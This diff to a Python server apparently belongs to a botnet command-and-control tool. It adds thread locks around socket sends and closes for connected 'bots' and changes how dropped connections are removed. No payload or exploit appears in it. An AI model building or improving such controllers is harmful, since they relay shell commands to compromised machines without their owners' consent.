@@ -29,14 +29,17 @@ class BotNet(Thread):
             # Notify recv thread
 
     def removeConnection(self, user):
+        # Will be making changes to allConnections
         with self.connlock:
             if user in self.allConnections:
+                # Wait for any sends to go through for this bot
                 # terminate and remove
                 try:
                     self.allConnections[user].close()
                 except:
                     pass
-                del self.allConnections[user]
+                # Remove object, don't delete so sends still go through
+                self.allConnections.pop(user)
                 self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                 print("[-] Lost connection to {}".format(user))
 
@@ -114,16 +117,19 @@ class Bot:
         self.sock = formatsock.FormatSocket(sock)
         self.arch = host_info['arch'][:-1]
         self.user = host_info['user'][:-1]
+        self.botlock = Lock()
 
     def send(self, cmd, type="stdin"):
         json_str = json.dumps({type: cmd})
-        self.sock.send(json_str)
+        with self.botlock:
+            self.sock.send(json_str)
 
     def recv(self):
         return self.sock.recv()
 
     def close(self):
-        self.sock.close()
+        with self.botlock:
+            self.sock.close()
 
     def fileno(self):
         '''
